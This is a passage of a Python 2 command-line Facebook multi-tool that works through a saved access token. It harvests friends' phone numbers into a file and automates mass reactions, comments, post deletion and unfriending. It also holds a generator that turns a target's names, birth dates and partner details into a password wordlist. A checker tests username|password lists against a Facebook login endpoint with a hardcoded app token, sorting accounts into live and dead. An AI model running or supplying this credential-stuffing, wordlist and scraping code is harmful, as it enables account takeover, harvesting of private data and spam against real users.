                jok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
                op = json.loads(jok.text)
                print '\x1b[0m[\x1b[95;1m\xe2\x9c\x93\x1b[0m] \x1b[0mFrom\x1b[0m :\x1b[77;1m ' + op['name']
            except KeyError:
                print '\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mNot be friends'
                raw_input('\n\x1b[0m[ \x1b[93;1mBack \x1b[0m]')
                grab()

            noms = raw_input('\x1b[0m[\x1b[92;1m+\x1b[0m] \x1b[77;1mSave File \x1b[0mext(file.txt) \x1b[0m: \x1b[77;1m')
            r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + toket)
            a = json.loads(r.text)
            no = open(noms, 'w')
            jalan('\x1b[0m[\x1b[93;1m\xe2\x9c\xba\x1b[0m] \x1b[77;1mPlease wait \x1b[77;1m...')
            print ''
            for i in a['data']:
                x = requests.get('https://graph.facebook.com/' + i['id'] + '?access_token=' + toket)
                z = json.loads(x.text)
                try:
                    hpfromfriends.append(z['mobile_phone'])
                    no.write(z['mobile_phone'] + '\n')
                    print '\r\x1b[0mName\x1b[0m  :\x1b[77;1m ' + z['name']
                    print '\x1b[0mPhone\x1b[0m : \x1b[77;1m' + z['mobile_phone']
                    print ''
                except KeyError:
                    pass

            print '\n\r\x1b[0m[\x1b[92;1m+\x1b[0m] \x1b[0mTotal number\x1b[77;1m %s' % len(hpfromfriends)
            print '\x1b[0m[\x1b[96;1m+\x1b[0m] \x1b[77;1mFile saved \x1b[77;1m: \x1b[0m' + noms
            no.close()
            raw_input('\n\x1b[0m[ \x1b[93;1mBack \x1b[0m]')
            grab()
        except IOError:
            print '\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mMake file failed'
            raw_input('\n\x1b[0m[ \x1b[93;1mBack \x1b[0m]')
            grab()
        except (KeyboardInterrupt, EOFError):
            print '\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mStopped'
            raw_input('\n\x1b[0m[ \x1b[93;1mBack \x1b[0m]')
            grab()
        except requests.exceptions.ConnectionError:
            print '\x1b[0m[\x1b[91;1m\xe2\x9c\x96\x1b[0m] \x1b[77;1mNo connection network'
            keluar()


def menu_bot():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mToken not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    os.system('clear')
    os.system('reset')
    print ''
    print logo
    print ''
    print '\x1b[0m[\x1b[96;1m1\x1b[0m] \x1b[77;1mBot Reactions Target Post'
    print '\x1b[0m[\x1b[96;1m2\x1b[0m] \x1b[77;1mBot Reactions Group Post'
    print '\x1b[0m[\x1b[96;1m3\x1b[0m] \x1b[77;1mBot Comment Target Post'
    print '\x1b[0m[\x1b[96;1m4\x1b[0m] \x1b[77;1mBot Comment Group Post'
    print '\x1b[0m[\x1b[96;1m5\x1b[0m] \x1b[77;1mMass Delete Post'
    print '\x1b[0m[\x1b[96;1m6\x1b[0m] \x1b[77;1mAccept Friend Requests'
    print '\x1b[0m[\x1b[96;1m7\x1b[0m] \x1b[77;1mUnfriends'
    print '\x1b[0m[\x1b[96;1m0\x1b[0m] \x1b[77;1mBack'
    print ''
    bot_pilih()


def bot_pilih():
    bots = raw_input('\x1b[0m[\x1b[95;1m~\x1b[0m] \x1b[77;1mSlect Option: ')
    if bots == '':
        print '\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mCan\'t empty'
        bot_pilih()
    else:
        if bots == '1':
            menu_react()
        else:
            if bots == '2':
                grup_react()
            else:
                if bots == '3':
                    bot_komen()
                else:
                    if bots == '4':
                        grup_komen()
                    else:
                        if bots == '5':
                            deletepost()
                        else:
                            if bots == '6':
                                accept()
                            else:
                                if bots == '7':
                                    unfriend()
                                else:
                                    if bots == '0':
                                        menu()
                                    else:
                                        print '\x1b[0m[\x1b[94;1m\xe2\x9c\x96\x1b[0m] \x1b[0m' + bots + ' \x1b[77;1mNot found'
                                        bot_pilih()


def menu_react():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mToken not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    os.system('clear')
    os.system('reset')
    print ''
    print logo
    print ''
    print '\x1b[0m[\x1b[96;1m1\x1b[0m] \x1b[77;1mLike'
    print '\x1b[0m[\x1b[96;1m2\x1b[0m] \x1b[77;1mLove'
    print '\x1b[0m[\x1b[96;1m3\x1b[0m] \x1b[77;1mWow'
    print '\x1b[0m[\x1b[96;1m4\x1b[0m] \x1b[77;1mHaha'
    print '\x1b[0m[\x1b[96;1m5\x1b[0m] \x1b[77;1mSad'
    print '\x1b[0m[\x1b[96;1m6\x1b[0m] \x1b[77;1mAngry'
    print '\x1b[0m[\x1b[96;1m0\x1b[0m] \x1b[77;1mBack'
    print ''
    react_pilih()


def react_pilih():
    global tipe
    aksi = raw_input('\x1b[0m[\x1b[95;1m~\x1b[0m] \x1b[77;1mSlect Option: ')
    if aksi == '':
        print '\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mCan\'t empty'
        react_pilih()
    else:
        if aksi == '1':
            tipe = 'LIKE'
            react()
        else:
            if aksi == '2':
                tipe = 'LOVE'
                react()
            else:
                if aksi == '3':
                    tipe = 'WOW'
                    react()
                else:
                    if aksi == '4':
                        tipe = 'HAHA'
                        react()
                    else:
                        if aksi == '5':
                            tipe = 'SAD'
                            react()
                        else:
                            if aksi == '6':
                                tipe = 'ANGRY'
                                react()
                            else:
                                if aksi == '0':
                                    menu_bot()
                                else:
                                    print '\x1b[0m[\x1b[94;1m\xe2\x9c\x96\x1b[0m] \x1b[0m' + aksi + ' \x1b[77;1mNot found'
                                    react_pilih()


def react():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mToken not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        os.system('clear')
        os.system('reset')
        print ''
        print logo
        print ''
        ide = raw_input('\x1b[0m[\x1b[92;1m+\x1b[0m] \x1b[0mID Target \x1b[0m:\x1b[77;1m ')
        limit = raw_input('\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mLimit \x1b[77;1m:\x1b[0m ')
        try:
            oh = requests.get('https://graph.facebook.com/' + ide + '?fields=feed.limit(' + limit + ')&access_token=' + toket)
            ah = json.loads(oh.text)
            jalan('\x1b[0m[\x1b[93;1m\xe2\x9c\xba\x1b[0m] \x1b[77;1mPlease wait \x1b[77;1m...')
            print ''
            for a in ah['feed']['data']:
                y = a['id']
                reaksi.append(y)
                requests.post('https://graph.facebook.com/' + y + '/reactions?type=' + tipe + '&access_token=' + toket)
                print '\x1b[0m[\x1b[77;1m' + y[:10].replace('\n', ' ') + '... \x1b[0m] \x1b[77;1m' + tipe

            print ''
            print '\r\x1b[0m[\x1b[94;1m#\x1b[0m]\x1b[77;1m Finish \x1b[0m' + str(len(reaksi))
            raw_input('\n\x1b[0m[ \x1b[93;1mBack \x1b[0m]')
            menu_bot()
        except KeyError:
            print '\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mID not found'
            raw_input('\n\x1b[0m[ \x1b[93;1mBack \x1b[0m]')
            menu_bot()


def grup_react():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mToken not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    os.system('clear')
    os.system('reset')
    print ''
    print logo
    print ''
    print '\x1b[0m[\x1b[96;1m1\x1b[0m] \x1b[77;1mLike'
    print '\x1b[0m[\x1b[96;1m2\x1b[0m] \x1b[77;1mLove'
    print '\x1b[0m[\x1b[96;1m3\x1b[0m] \x1b[77;1mWow'
    print '\x1b[0m[\x1b[96;1m4\x1b[0m] \x1b[77;1mHaha'
    print '\x1b[0m[\x1b[96;1m5\x1b[0m] \x1b[77;1mSad'
    print '\x1b[0m[\x1b[96;1m6\x1b[0m] \x1b[77;1mAngry'
    print '\x1b[0m[\x1b[96;1m0\x1b[0m] \x1b[77;1mBack'
    print ''
    reactg_pilih()


def reactg_pilih():
    global tipe
    aksi = raw_input('\x1b[0m[\x1b[95;1m~\x1b[0m] \x1b[77;1mSlect Option: ')
    if aksi == '':
        print '\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mCan\'t empty'
        reactg_pilih()
    else:
        if aksi == '1':
            tipe = 'LIKE'
            reactg()
        else:
            if aksi == '2':
                tipe = 'LOVE'
                reactg()
            else:
                if aksi == '3':
                    tipe = 'WOW'
                    reactg()
                else:
                    if aksi == '4':
                        tipe = 'HAHA'
                        reactg()
                    else:
                        if aksi == '5':
                            tipe = 'SAD'
                            reactg()
                        else:
                            if aksi == '6':
                                tipe = 'ANGRY'
                                reactg()
                            else:
                                if aksi == '0':
                                    menu_bot()
                                else:
                                    print '\x1b[0m[\x1b[94;1m\xe2\x9c\x96\x1b[0m] \x1b[0m' + aksi + ' \x1b[77;1mNot found'
                                    reactg_pilih()


def reactg():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mToken not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        os.system('clear')
        os.system('reset')
        print ''
        print logo
        print ''
        ide = raw_input('\x1b[0m[\x1b[92;1m+\x1b[0m] \x1b[0mID Group \x1b[0m:\x1b[77;1m ')
        limit = raw_input('\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mLimit \x1b[77;1m:\x1b[0m ')
        ah = requests.get('https://graph.facebook.com/group/?id=' + ide + '&access_token=' + toket)
        asw = json.loads(ah.text)
        print '\x1b[0m[\x1b[96;1m\xe2\x9c\x93\x1b[0m] \x1b[0mGroup name \x1b[0m:\x1b[77;1m ' + asw['name']
        try:
            oh = requests.get('https://graph.facebook.com/v3.0/' + ide + '?fields=feed.limit(' + limit + ')&access_token=' + toket)
            ah = json.loads(oh.text)
            jalan('\x1b[0m[\x1b[93;1m\xe2\x9c\xba\x1b[0m] \x1b[77;1mPlease wait \x1b[77;1m...')
            print ''
            for a in ah['feed']['data']:
                y = a['id']
                reaksigrup.append(y)
                requests.post('https://graph.facebook.com/' + y + '/reactions?type=' + tipe + '&access_token=' + toket)
                print '\x1b[0m[\x1b[77;1m' + y[:10].replace('\n', ' ') + '... \x1b[0m] \x1b[77;1m' + tipe

            print ''
            print '\r\x1b[0m[\x1b[94;1m#\x1b[0m] \x1b[77;1mFinish \x1b[0m' + str(len(reaksigrup))
            raw_input('\n\x1b[0m[ \x1b[93;1mBack \x1b[0m]')
            menu_bot()
        except KeyError:
            print '\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mID not found'
            raw_input('\n\x1b[0m[ \x1b[93;1mBack \x1b[0m]')
            menu_bot()


def bot_komen():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mToken not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        os.system('clear')
        os.system('reset')
        print ''
        print logo
        print ''
        print "\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mUse \x1b[0m'<>' \x1b[77;1m for newline"
        ide = raw_input('\x1b[0m[\x1b[92;1m+\x1b[0m] \x1b[0mID Target \x1b[0m:\x1b[77;1m ')
        km = raw_input('\x1b[0m[\x1b[95;1m+\x1b[0m] \x1b[0mComments  \x1b[0m:\x1b[77;1m ')
        limit = raw_input('\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[0mLimit \x1b[0m:\x1b[77;1m ')
        km = km.replace('<>', '\n')
        try:
            p = requests.get('https://graph.facebook.com/' + ide + '?fields=feed.limit(' + limit + ')&access_token=' + toket)
            a = json.loads(p.text)
            jalan('\x1b[0m[\x1b[93;1m\xe2\x9c\xba\x1b[0m] \x1b[77;1mPlease wait \x1b[77;1m...')
            print ''
            for s in a['feed']['data']:
                f = s['id']
                komen.append(f)
                requests.post('https://graph.facebook.com/' + f + '/comments?message=' + km + '&access_token=' + toket)
                print '\x1b[0m[\x1b[77;1m' + km[:10].replace('\n', ' ') + '... \x1b[0m]'

            print
            print '\r\x1b[0m[\x1b[94;1m#\x1b[0m] \x1b[77;1mFinish \x1b[0m' + str(len(komen))
            raw_input('\n\x1b[0m[ \x1b[93;1mBack \x1b[0m]')
            menu_bot()
        except KeyError:
            print '\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mID not found'
            raw_input('\n\x1b[0m[ \x1b[93;1mBack \x1b[0m]')
            menu_bot()


def grup_komen():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mToken not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        os.system('clear')
        os.system('reset')
        print ''
        print logo
        print ''
        print "\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mUse \x1b[0m'<>' \x1b[77;1mfor new line"
        ide = raw_input('\x1b[0m[\x1b[92;1m+\x1b[0m] \x1b[0mID Group  \x1b[0m:\x1b[77;1m ')
        km = raw_input('\x1b[0m[\x1b[95;1m+\x1b[0m] \x1b[0mComments \x1b[0m:\x1b[77;1m ')
        limit = raw_input('\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[0mLimit \x1b[0m:\x1b[77;1m ')
        km = km.replace('<>', '\n')
        try:
            ah = requests.get('https://graph.facebook.com/group/?id=' + ide + '&access_token=' + toket)
            asw = json.loads(ah.text)
            print '\x1b[0m[\x1b[96;1m\xe2\x9c\x93\x1b[0m] \x1b[0mGroup Name \x1b[0m:\x1b[77;1m ' + asw['name']
            p = requests.get('https://graph.facebook.com/v3.0/' + ide + '?fields=feed.limit(' + limit + ')&access_token=' + toket)
            a = json.loads(p.text)
            jalan('\x1b[0m[\x1b[93;1m\xe2\x9c\xba\x1b[0m] \x1b[77;1mPlease wait \x1b[77;1m...')
            print ''
            for s in a['feed']['data']:
                f = s['id']
                komengrup.append(f)
                requests.post('https://graph.facebook.com/' + f + '/comments?message=' + km + '&access_token=' + toket)
                print '\x1b[0m[\x1b[77;1m' + km[:10].replace('\n', ' ') + '... \x1b[0m]'

            print
            print '\r\x1b[0m[\x1b[94;1m#\x1b[0m] \x1b[77;1mFinish \x1b[0m' + str(len(komengrup))
            raw_input('\n\x1b[0m[ \x1b[93;1mBack \x1b[0m]')
            menu_bot()
        except KeyError:
            print '\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mID not found'
            raw_input('\n\x1b[0m[ \x1b[93;1mBack \x1b[0m]')
            menu_bot()


def deletepost():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
        nam = requests.get('https://graph.facebook.com/me?access_token=' + toket)
        lol = json.loads(nam.text)
        nama = lol['name']
    except IOError:
        print '\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mToken not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    os.system('clear')
    os.system('reset')
    print ''
    print logo
    print ''
    print '\x1b[0m[\x1b[92;1m+\x1b[0m] \x1b[0mFrom \x1b[0m: \x1b[77;1m %s' % nama
    jalan('\x1b[0m[\x1b[92;1m+\x1b[0m] \x1b[77;1mStarting remove status\x1b[77;1m ...')
    print ''
    asu = requests.get('https://graph.facebook.com/me/feed?access_token=' + toket)
    asus = json.loads(asu.text)
    for p in asus['data']:
        id = p['id']
        piro = 0
        url = requests.get('https://graph.facebook.com/' + id + '?method=delete&access_token=' + toket)
        ok = json.loads(url.text)
        try:
            error = ok['error']['message']
            print '\x1b[0m[\x1b[77;1m' + id[:10].replace('\n', ' ') + '...' + '\x1b[0m] \x1b[77;1mFailed'
        except TypeError:
            print '\x1b[0m[\x1b[77;1m' + id[:10].replace('\n', ' ') + '...' + '\x1b[0m] \x1b[77;1mRemoved'
            piro += 1
        except requests.exceptions.ConnectionError:
            print '\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mConnection Error'
            raw_input('\n\x1b[0m[ \x1b[93;1mBack \x1b[0m]')
            menu_bot()

    print '\n\x1b[0m[\x1b[94;1m#\x1b[0m] \x1b[77;1mFinish'
    raw_input('\n\x1b[0m[ \x1b[93;1mBack \x1b[0m]')
    menu_bot()


def accept():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mToken not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    os.system('clear')
    os.system('reset')
    print ''
    print logo
    print ''
    limit = raw_input('\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[0mLimit \x1b[0m:\x1b[77;1m ')
    r = requests.get('https://graph.facebook.com/me/friendrequests?limit=' + limit + '&access_token=' + toket)
    friends = json.loads(r.text)
    if '[]' in str(friends['data']):
        print '\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mNo friends request'
        raw_input('\n\x1b[0m[ \x1b[93;1mBack \x1b[0m]')
        menu_bot()
    jalan('\x1b[0m[\x1b[93;1m\xe2\x9c\xba\x1b[0m] \x1b[77;1mPlease wait \x1b[77;1m...')
    print ''
    for i in friends['data']:
        gas = requests.post('https://graph.facebook.com/me/friends/' + i['from']['id'] + '?access_token=' + toket)
        a = json.loads(gas.text)
        if 'error' in str(a):
            print '\x1b[0m[\x1b[92;1m+\x1b[0m] \x1b[0mName  \x1b[0m:\x1b[77;1m ' + i['from']['name']
            print '\x1b[0m[\x1b[95;1m+\x1b[0m] \x1b[0mID    \x1b[0m:\x1b[77;1m ' + i['from']['id'] + '\x1b[77;1m Failed'
            print ''
        else:
            print '\x1b[0m[\x1b[92;1m+\x1b[0m] \x1b[0mName  \x1b[0m:\x1b[77;1m ' + i['from']['name']
            print '\x1b[0m[\x1b[95;1m+\x1b[0m] \x1b[0mID    \x1b[0m:\x1b[77;1m ' + i['from']['id'] + '\x1b[77;1m Success'
            print ''

    print '\n\x1b[0m[\x1b[94;1m#\x1b[0m] \x1b[77;1mFinish'
    raw_input('\n\x1b[0m[ \x1b[93;1mBack \x1b[0m]')
    menu_bot()


def unfriend():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mToken not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        os.system('clear')
        os.system('reset')
        print ''
        print logo
        print ''
        jalan('\x1b[0m[\x1b[93;1m\xe2\x9c\xba\x1b[0m] \x1b[77;1mPlease wait \x1b[77;1m...')
        print ''
        print '\x1b[77;1mStop \x1b[0mCTRL+C'
        print ''
        try:
            pek = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
            cok = json.loads(pek.text)
            for i in cok['data']:
                nama = i['name']
                id = i['id']
                requests.delete('https://graph.facebook.com/me/friends?uid=' + id + '&access_token=' + toket)
                print '\x1b[0m[\x1b[77;1mRemove\x1b[0m] \x1b[77;1m' + nama + ' => ' + id

        except IndexError:
            pass
        except KeyboardInterrupt:
            print '\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mStopped'
            raw_input('\n\x1b[0m[ \x1b[93;1mBack \x1b[0m]')
            menu_bot()

    print '\n\x1b[0m[\x1b[94;1m#\x1b[0m] \x1b[77;1mFinish'
    raw_input('\n\x1b[0m[ \x1b[93;1mBack \x1b[0m]')
    menu_bot()


def lain():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mToken not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    os.system('clear')
    os.system('reset')
    print ''
    print logo
    print ''
    print '\x1b[0m[\x1b[96;1m1\x1b[0m] \x1b[77;1mWrite Status'
    print '\x1b[0m[\x1b[96;1m2\x1b[0m] \x1b[77;1mMake Wordlist'
    print '\x1b[0m[\x1b[96;1m3\x1b[0m] \x1b[77;1mAccount Checker'
    print '\x1b[0m[\x1b[96;1m4\x1b[0m] \x1b[77;1mList Group'
    print '\x1b[0m[\x1b[96;1m5\x1b[0m] \x1b[77;1mProfile Guard'
    print '\x1b[0m[\x1b[96;1m0\x1b[0m] \x1b[77;1mBack'
    print ''
    pilih_lain()


def pilih_lain():
    other = raw_input('\x1b[0m[\x1b[95;1m~\x1b[0m] \x1b[77;1mSlect Option: ')
    if other == '':
        print '\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mCan\'t empty'
        pilih_lain()
    else:
        if other == '1':
            status()
        else:
            if other == '2':
                wordlist()
            else:
                if other == '3':
                    check_akun()
                else:
                    if other == '4':
                        grupsaya()
                    else:
                        if other == '5':
                            guard()
                        else:
                            if other == '0':
                                menu()
                            else:
                                print '\x1b[0m[\x1b[94;1m\xe2\x9c\x96\x1b[0m] \x1b[0m' + other + ' \x1b[77;1mNot found'
                                pilih_lain()


def status():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mToken not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    os.system('clear')
    os.system('reset')
    print ''
    print logo
    print ''
    msg = raw_input('\x1b[0m[\x1b[92;1m+\x1b[0m] \x1b[0mWrite status \x1b[0m:\x1b[77;1m ')
    if msg == '':
        print ' \x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mCan\'t empty'
        raw_input('\n\x1b[0m[ \x1b[93;1mBack \x1b[0m]')
        lain()
    else:
        res = requests.get('https://graph.facebook.com/me/feed?method=POST&message=' + msg + '&access_token=' + toket)
        op = json.loads(res.text)
        jalan('\x1b[0m[\x1b[93;1m\xe2\x9c\xba\x1b[0m] \x1b[77;1mPlease wait \x1b[77;1m...')
        print ''
        print '\x1b[0m[\x1b[95;1m+\x1b[0m] \x1b[77;1mStatus ID\x1b[77;1m : \x1b[0m' + op['id']
        raw_input('\n\x1b[0m[ \x1b[93;1mBack \x1b[0m]')
        lain()


def wordlist():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mToken not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        try:
            os.system('clear')
            os.system('reset')
            print ''
            print logo
            print ''
            print '\x1b[0m[\x1b[95;1m?\x1b[0m] \x1b[77;1mFill in the complete target data below'
            print ''
            a = raw_input('\x1b[0m[\x1b[92;1m+\x1b[0m] \x1b[0mFirst name \x1b[77;1m: ')
            file = open(a + '.txt', 'w')
            b = raw_input('\x1b[0m[\x1b[92;1m+\x1b[0m] \x1b[0mMiddle name \x1b[77;1m: ')
            c = raw_input('\x1b[0m[\x1b[92;1m+\x1b[0m] \x1b[0mLast name \x1b[77;1m: ')
            d = raw_input('\x1b[0m[\x1b[92;1m+\x1b[0m] \x1b[0mNick name \x1b[77;1m: ')
            e = raw_input('\x1b[0m[\x1b[92;1m+\x1b[0m] \x1b[0mDate of birth >\x1b[0mex: |DDMMYY| \x1b[77;1m: ')
            f = e[0:2]
            g = e[2:4]
            h = e[4:]
            print ''
            print '\x1b[0m[\x1b[95;1m?\x1b[0m] \x1b[77;1mIf your e single, just skip it: '
            print ''
            i = raw_input('\x1b[0m[\x1b[94;1m+\x1b[0m] \x1b[0mPartners name \x1b[77;1m: ')
            j = raw_input('\x1b[0m[\x1b[94;1m+\x1b[0m] \x1b[0mPartners nickname \x1b[77;1m: ')
            k = raw_input('\x1b[0m[\x1b[94;1m+\x1b[0m] \x1b[0mDate of birth of a partner >\x1b[0mex: |DDMMYY| \x1b[77;1m: ')
            jalan('\x1b[0m[\x1b[93;1m\xe2\x9c\xba\x1b[0m] \x1b[77;1mPlease wait \x1b[77;1m...')
            l = k[0:2]
            m = k[2:4]
            n = k[4:]
            file.write('%s%s\n%s%s%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s%s\n%s%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s%s\n%s%s%s\n%s%s%s\n%s%s%s\n%s%s%s\n%s%s%s\n%s%s%s\n%s%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s' % (a, c, a, b, b, a, b, c, c, a, c, b, a, a, b, b, c, c, a, d, b, d, c, d, d, d, d, a, d, b, d, c, a, e, a, f, a, g, a, h, b, e, b, f, b, g, b, h, c, e, c, f, c, g, c, h, d, e, d, f, d, g, d, h, e, a, f, a, g, a, h, a, e, b, f, b, g, b, h, b, e, c, f, c, g, c, h, c, e, d, f, d, g, d, h, d, d, d, a, f, g, a, g, h, f, g, f, h, f, f, g, f, g, h, g, g, h, f, h, g, h, h, h, g, f, a, g, h, b, f, g, b, g, h, c, f, g, c, g, h, d, f, g, d, g, h, a, i, a, j, a, k, i, e, i, j, i, k, b, i, b, j, b, k, c, i, c, j, c, k, e, k, j, a, j, b, j, c, j, d, j, j, k, a, k, b, k, c, k, d, k, k, i, l, i, m, i, n, j, l, j, m, j, n, j, k))
            wg = 0
            while wg < 100:
                wg = wg + 1
                file.write(a + str(wg) + '\n')

            en = 0
            while en < 100:
                en = en + 1
                file.write(i + str(en) + '\n')

            word = 0
            while word < 100:
                word = word + 1
                file.write(d + str(word) + '\n')

            gen = 0
            while gen < 100:
                gen = gen + 1
                file.write(j + str(gen) + '\n')

            file.close()
            time.sleep(1.5)
            print '\n\x1b[0m[\x1b[96;1m+\x1b[0m] \x1b[77;1mSaved \x1b[0m: \x1b[0m %s.txt' % a
            raw_input('\n\x1b[0m[ \x1b[93;1mBack \x1b[0m]')
            lain()
        except IOError as e:
            print '\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mMake file failed'
            raw_input('\n\x1b[0m[ \x1b[93;3mBack \x1b[0m]')
            lain()


def check_akun():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mToken not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        os.system('clear')
        os.system('reset')
        print ''
        print logo
        print ''
        print '\x1b[0m[\x1b[95;1m?\x1b[0m] \x1b[77;1mContent file\x1b[77;1m : \x1b[0musername|password'
        print ''
        live = []
        cek = []
        die = []
        try:
            file = raw_input('\x1b[0m[\x1b[92;1m+\x1b[0m] \x1b[77;1mFile \x1b[77;1m:\x1b[0m ')
            list = open(file, 'r').readlines()
        except IOError:
            print '\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mFile not found'
            raw_input('\n\x1b[0m[ \x1b[93;1mBack \x1b[0m]')
            lain()

    pemisah = raw_input('\x1b[0m[\x1b[94;1m+\x1b[0m] \x1b[77;1mSeparator \x1b[77;1m:\x1b[0m ')
    jalan('\x1b[0m[\x1b[93;1m\xe2\x9c\xba\x1b[0m] \x1b[77;1mPlease wait \x1b[77;1m...')
    print ''
    for meki in list:
        username, password = meki.strip().split(str(pemisah))
        url = 'https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + username + '&locale=en_US&password=' + password + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6'
        data = requests.get(url)
        mpsh = json.loads(data.text)
        if 'access_token' in mpsh:
            live.append(password)
            print '\x1b[0m[\x1b[77;1mLive\x1b[0m] \x1b[77;1m' + username + ' | ' + password
        elif 'www.facebook.com' in mpsh['error_msg']:
            cek.append(password)
            print '\x1b[0m[\x1b[77;1mCheck\x1b[0m]\x1b[77;1m' + username + ' | ' + password
        else:
            die.append(password)
            print '\x1b[0m[\x1b[77;1mDie\x1b[0m]  \x1b[77;1m' + username + ' | ' + password

    print '\n\x1b[0m[\x1b[96;1m+\x1b[0m] \x1b[77;1mTotal\x1b[0m : \x1b[77;1mLive=\x1b[0m' + str(len(live)) + ' \x1b[77;1mCheck=\x1b[0m' + str(len(cek)) + ' \x1b[77;1mDie=\x1b[0m' + str(len(die))
    raw_input('\n\x1b[0m[ \x1b[93;1mBack \x1b[0m]')
    lain()


def grupsaya():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mToken not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        os.system('clear')
        os.system('reset')
        print ''
        print logo
        print ''
